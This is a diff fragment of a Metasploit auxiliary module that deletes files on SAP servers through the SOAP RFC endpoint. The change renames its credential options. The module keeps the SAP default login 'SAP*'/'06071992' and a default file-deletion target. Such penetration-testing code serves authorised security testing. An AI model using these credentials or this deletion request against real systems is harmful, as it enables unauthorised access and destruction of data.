@@ -51,8 +51,8 @@ class MetasploitModule < Msf::Auxiliary
     register_options([
       Opt::RPORT(8000),
       OptString.new('CLIENT', [true, 'SAP Client', '001']),
-      OptString.new('USERNAME', [true, 'Username', 'SAP*']),
-      OptString.new('PASSWORD', [true, 'Password', '06071992']),
+      OptString.new('HTTPUSERNAME', [true, 'Username', 'SAP*']),
+      OptString.new('HTTPPASSWORD', [true, 'Password', '06071992']),
       OptString.new('DIRNAME', [true, 'Directory Path which contains the file to delete', '/tmp']),
       OptString.new('FILENAME', [true, 'Filename to delete', 'msf.txt'])
     ], self.class)
@@ -80,7 +80,7 @@ class MetasploitModule < Msf::Auxiliary
         'uri' => '/sap/bc/soap/rfc',
         'method' => 'POST',
         'data' => data,
-        'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
+        'authorization' => basic_auth(datastore['HTTPUSERNAME'], datastore['HTTPPASSWORD']),
         'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
         'ctype' => 'text/xml; charset=UTF-8',
         'headers' => {
